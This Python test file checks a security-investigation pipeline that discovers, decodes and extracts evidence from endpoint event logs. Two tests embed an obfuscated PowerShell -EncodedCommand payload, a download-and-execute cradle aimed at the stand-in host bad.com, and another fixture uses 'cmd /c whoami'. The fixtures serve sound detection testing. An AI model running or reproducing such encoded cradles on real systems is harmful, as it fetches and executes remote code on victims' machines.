"""Stages 5–7 · Artifact Discovery, Recursive Decoder, Evidence
Extraction tests."""
import json

from nivxforge.investigation.pipeline.artifact_discovery import discover
from nivxforge.investigation.pipeline.evidence_extraction import extract
from nivxforge.investigation.pipeline.input_classification import classify_input
from nivxforge.investigation.pipeline.normalizers import normalize
from nivxforge.investigation.pipeline.parser import parse_input
from nivxforge.investigation.pipeline.recursive_decoder import decode
from nivxforge.investigation.pipeline.vendor_detection import detect_vendor


def _cem(raw: str):
    parsed = parse_input(raw, classify_input(raw))
    return normalize(parsed, detect_vendor(parsed))


def test_artifact_discovery_finds_command_line_in_cem():
    cem = _cem(json.dumps({
        "EventID": 1, "Computer": "h",
        "CommandLine": "powershell -EncodedCommand SGVsbG8="
    }))
    arts = discover(cem)
    kinds = {a.kind for a in arts}
    assert "command_line" in kinds or "encoded_command" in kinds


def test_recursive_decoder_utf16le_powershell():
    """PowerShell -EncodedCommand payload uses UTF-16LE base64. The
    decoder MUST decode it correctly."""
    raw = ("powershell.exe -EncodedCommand "
            "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
            "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
            "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
            "BtAC8AcAAxACcAKQAp")
    cem = _cem(raw)
    arts = discover(cem)
    layers = decode(arts)
    assert layers, "expected at least one decoded layer"
    top = layers[0]
    assert top.scheme in ("b64_utf16le", "base64", "b64_gzip")
    assert "http://bad.com" in top.output.lower() or "downloadstring" in top.output.lower()


def test_recursive_decoder_ignores_short_or_binary():
    # Random non-base64 should not produce decoded output.
    cem = _cem(json.dumps({"cmdLine": "explorer.exe"}))
    layers = decode(discover(cem))
    assert layers == []


def test_evidence_extraction_dedups_hosts_and_hashes():
    payload = json.dumps({
        "EventID": 1, "Computer": "host-a",
        "Image": "cmd.exe", "CommandLine": "cmd /c whoami",
        "Hashes": "SHA256=" + "c" * 64, "ProcessId": 100,
    })
    cem = _cem(payload)
    arts = discover(cem)
    layers = decode(arts)
    bundle = extract(cem, arts, layers)
    hosts = bundle.by_kind("host")
    assert len(hosts) == 1
    assert hosts[0].value == "host-a"
    hashes = bundle.by_kind("hash")
    assert any(h.value == "c" * 64 for h in hashes)


def test_evidence_extraction_pulls_iocs_from_decoded():
    """Regression: URLs inside the decoded PowerShell payload must
    appear in the evidence bundle as `url` items."""
    raw = ("powershell.exe -EncodedCommand "
            "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
            "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
            "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
            "BtAC8AcAAxACcAKQAp")
    cem = _cem(raw)
    arts = discover(cem)
    layers = decode(arts)
    bundle = extract(cem, arts, layers)
    urls = bundle.by_kind("url")
    assert any("bad.com" in u.value for u in urls)
